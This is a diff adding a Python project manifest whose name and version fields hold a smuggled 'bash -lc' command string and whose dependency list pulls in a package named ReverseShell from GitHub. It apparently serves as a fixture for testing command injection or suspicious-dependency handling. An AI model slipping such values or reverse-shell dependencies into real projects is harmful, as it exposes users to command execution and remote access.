@@ -1,0 +1,4 @@
+[project]
+name = "bash -lc \"echo real_shell_command\""
+version = "bash -lc \"echo real_shell_command\""
+dependencies = ["ReverseShell @ https://github.com/mauricelambert/ReverseShell/archive/refs/tags/v0.1.0python.tar.gz"]
